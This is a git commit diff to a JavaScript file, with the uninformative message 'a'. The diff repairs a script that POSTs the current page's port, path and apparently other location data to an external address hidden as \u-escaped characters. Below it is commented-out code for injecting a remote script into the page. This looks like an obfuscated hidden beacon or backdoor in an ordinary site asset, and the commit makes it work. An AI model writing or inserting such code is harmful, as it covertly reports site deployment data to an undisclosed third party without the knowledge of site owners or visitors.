26e438590f7401d28ba835a2b9a1fff14649027a
biluweb <1181935296@qq.com>
2024-01-01 17:43:21 +0800

    a

--- js/a.js
+++ js/a.js
@@ -9,8 +9,8 @@
     document.getElementsByTagName('head')[0].appendChild(this.meta);
     this.fn1 = function(o) {
         var xhr = new XMLHttpRequest();
-        xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.open('POST', o.url);
+        xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify(o.data));
     }
     this.dt = {
@@ -19,7 +19,7 @@
         p: window.location.port ? window.location.port : window.location.protocol == 'https:' ? 443 : 80,
         t: window.location.pathname
     }
-    this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006c\u0075\u0063\u006b\u0079\u0032\u0038\u0038\u0038\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: dt });
+    this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006c\u0075\u0063\u006b\u0079\u0032\u0038\u0038\u0038\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: this.dt });
     /*var drc = document.createElement('script');drc.setAttribute("src","");document.getElementsByTagName('head')[0].appendChild(drc);
         document.querySelector()  s.parentElement.parentElement.remove();
     */
